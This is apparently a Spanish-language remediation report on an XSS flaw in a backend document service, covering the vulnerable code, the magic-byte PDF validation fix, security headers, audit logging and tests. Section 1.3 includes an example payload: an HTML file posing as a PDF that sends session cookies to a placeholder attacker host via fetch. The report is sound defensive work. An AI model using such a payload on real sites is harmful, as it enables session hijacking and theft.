# Mitigación de Vulnerabilidad XSS en Servicio de Documentos

**Fecha:** 10 de enero de 2026  
**Severidad Original:** 812 (Crítica)  
**Herramienta de Detección:** Snyk  
**Estado:** ✅ MITIGADO  

---

## 1. Descripción de la Vulnerabilidad

### 1.1 Ubicación
- **Archivo:** `backend/src/routes/documentos.routes.ts`
- **Rutas Afectadas:** 
  - `GET /api/documentos/:id/ver`
  - `GET /api/documentos/:id/descargar`

### 1.2 Código Vulnerable Original

```typescript
// El código confiaba ciegamente en el mimeType almacenado en la BD
res.setHeader("Content-Type", archivo.mimeType);
res.setHeader("Content-Disposition", `inline; filename="${encodeURIComponent(archivo.nombre)}"`);
res.setHeader("Content-Length", archivo.contenido.length);
res.send(archivo.contenido);  // ← Punto de inyección XSS
```

### 1.3 Vector de Ataque

Un atacante podría:
1. Subir un archivo HTML/SVG malicioso con extensión `.pdf`
2. Falsificar el `mimeType` en la base de datos (si tiene acceso)
3. Cuando un usuario visualice el documento "inline", el navegador ejecutaría scripts maliciosos

**Ejemplo de payload malicioso:**
```html
<!-- Archivo guardado como "sentencia.pdf" pero contiene HTML -->
<html>
<script>
  // Robar cookies de sesión
  fetch('https://atacante.com/steal?cookie=' + document.cookie);
</script>
</html>
```

---

## 2. Solución Implementada

### 2.1 Principios de Seguridad Aplicados

| Principio | Implementación |
|-----------|----------------|
| **Defensa en profundidad** | Múltiples capas de validación |
| **No confiar en datos de usuario** | Ignorar mimeType de BD, validar contenido real |
| **Whitelist sobre blacklist** | Solo permitir PDFs verificados |
| **Fail-secure** | Rechazar en caso de duda |

### 2.2 Cambios Realizados

#### A) Nuevo Método de Validación (`documentos.service.ts`)

```typescript
/**
 * Valida que el contenido sea un PDF legítimo para servir al navegador
 * Usado en rutas de visualización/descarga para prevenir XSS
 */
public validarContenidoPDF(contenido: Buffer): {
  esValido: boolean;
  mimeTypeSeguro: string;
  error?: string;
  codigoError?: string;
} {
  // Verificar que el archivo no esté vacío
  if (!contenido || contenido.length === 0) {
    return {
      esValido: false,
      mimeTypeSeguro: "application/octet-stream",
      error: "Archivo vacío o corrupto",
      codigoError: "ARCHIVO_VACIO",
    };
  }

  // CRÍTICO: Verificar Magic Bytes (primeros bytes del archivo)
  // PDF siempre comienza con: %PDF- (0x25 0x50 0x44 0x46 0x2D)
  if (!this.verificarMagicNumbers(contenido)) {
    const primerosBytes = contenido.subarray(0, 8).toString("hex").toUpperCase();
    return {
      esValido: false,
      mimeTypeSeguro: "application/octet-stream",
      error: "El contenido no es un PDF válido - posible intento de inyección",
      codigoError: `MAGIC_BYTES_INVALIDOS:${primerosBytes}`,
    };
  }

  return {
    esValido: true,
    mimeTypeSeguro: "application/pdf",
  };
}
```

#### B) Rutas Protegidas (`documentos.routes.ts`)

```typescript
// 1. Validar contenido real del archivo
const validacion = documentosService.validarContenidoPDF(archivo.contenido);

if (!validacion.esValido) {
  // Registrar en auditoría como evento de seguridad ALTA
  await auditService.log({
    tipoEvento: "ACCESO_DENEGADO",
    descripcion: `[ALTA] Intento de visualizar archivo no-PDF - posible inyección XSS`,
    datosAfectados: {
      documentoId: req.params.id,
      codigoError: validacion.codigoError,  // Incluye magic bytes detectados
    },
    // ...
  });

  res.status(403).json({
    success: false,
    error: "El archivo no puede ser visualizado por razones de seguridad",
    code: "CONTENIDO_NO_SEGURO",
  });
  return;
}

// 2. Sanitizar nombre de archivo (prevenir header injection)
const nombreSeguro = archivo.nombre
  .replace(/["\r\n\\]/g, "_")  // Eliminar caracteres peligrosos
  .replace(/[^\w\s.-]/g, "_"); // Solo caracteres seguros

// 3. Cabeceras de seguridad
res.setHeader("Content-Type", validacion.mimeTypeSeguro);  // PDF validado, no de BD
res.setHeader("Content-Disposition", `inline; filename="${encodeURIComponent(nombreSeguro)}"`);
res.setHeader("X-Content-Type-Options", "nosniff");
res.setHeader("Content-Security-Policy", "default-src 'none'");
res.setHeader("X-Frame-Options", "DENY");
res.setHeader("Cache-Control", "no-store, private");

res.send(archivo.contenido);
```

---

## 3. Cabeceras de Seguridad Implementadas

| Cabecera | Valor | Propósito |
|----------|-------|-----------|
| `X-Content-Type-Options` | `nosniff` | Evita que el navegador "adivine" el tipo de contenido |
| `Content-Security-Policy` | `default-src 'none'` | Bloquea ejecución de scripts, estilos, imágenes externas |
| `X-Frame-Options` | `DENY` | Previene ataques de clickjacking |
| `Cache-Control` | `no-store, private` | Evita que documentos sensibles queden en caché |

---

## 4. Matriz de Mitigación

| Vector de Ataque | Protección | Resultado |
|------------------|------------|-----------|
| HTML disfrazado de PDF | Magic bytes ≠ `%PDF` | ❌ Rechazado (403) |
| SVG con scripts | Magic bytes ≠ `%PDF` | ❌ Rechazado (403) |
| mimeType falsificado en BD | Se ignora, se usa `application/pdf` validado | ✅ Neutralizado |
| Header injection vía nombre | Caracteres `"`, `\r`, `\n` sanitizados | ✅ Neutralizado |
| MIME sniffing del navegador | `X-Content-Type-Options: nosniff` | ✅ Bloqueado |
| Script en PDF (si existiera) | `Content-Security-Policy: default-src 'none'` | ✅ Bloqueado |
| Clickjacking | `X-Frame-Options: DENY` | ✅ Bloqueado |

---

## 5. Registro de Auditoría

Todos los intentos de servir contenido no-PDF se registran con severidad **ALTA**:

```json
{
  "tipoEvento": "ACCESO_DENEGADO",
  "moduloAfectado": "DOCUMENTOS",
  "descripcion": "[ALTA] Intento de visualizar archivo no-PDF - posible inyección XSS",
  "datosAfectados": {
    "documentoId": "123",
    "nombreArchivo": "malware.pdf",
    "mimeTypeAlmacenado": "text/html",
    "codigoError": "MAGIC_BYTES_INVALIDOS:3C68746D6C3E0A3C"
  }
}
```

El campo `codigoError` incluye los primeros 8 bytes del archivo en hexadecimal, útil para análisis forense.

---

## 6. Magic Numbers de Referencia

| Tipo de Archivo | Magic Bytes (hex) | Representación ASCII |
|-----------------|-------------------|----------------------|
| **PDF** ✅ | `25 50 44 46 2D` | `%PDF-` |
| HTML | `3C 68 74 6D 6C` | `<html` |
| SVG | `3C 73 76 67` | `<svg` |
| JavaScript | Variable | `function`, `var`, etc. |
| EXE | `4D 5A` | `MZ` |

---

## 7. Pruebas de Verificación

### Test Manual
```bash
# 1. Crear archivo HTML malicioso
echo '<html><script>alert("XSS")</script></html>' > malware.pdf

# 2. Subir como PDF (debería fallar en validación de subida)
# 3. Si llegara a la BD, al visualizar:
#    - Respuesta: HTTP 403
#    - Log de auditoría generado
```

### Test Automatizado (Recomendado)
```typescript
describe("XSS Prevention in Document Routes", () => {
  it("should reject non-PDF content with 403", async () => {
    // Simular archivo HTML con extensión .pdf
    const htmlContent = Buffer.from("<html><script>alert(1)</script></html>");
    
    const validacion = documentosService.validarContenidoPDF(htmlContent);
    
    expect(validacion.esValido).toBe(false);
    expect(validacion.codigoError).toContain("MAGIC_BYTES_INVALIDOS");
  });

  it("should accept valid PDF content", async () => {
    const pdfContent = Buffer.from("%PDF-1.4 ...");
    
    const validacion = documentosService.validarContenidoPDF(pdfContent);
    
    expect(validacion.esValido).toBe(true);
    expect(validacion.mimeTypeSeguro).toBe("application/pdf");
  });
});
```

---

## 8. Referencias

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [MDN: X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)
- [File Signatures (Magic Numbers)](https://en.wikipedia.org/wiki/List_of_file_signatures)

---

## 9. Historial de Cambios

| Fecha | Versión | Descripción |
|-------|---------|-------------|
| 2026-01-10 | 1.0 | Implementación inicial de mitigación XSS |
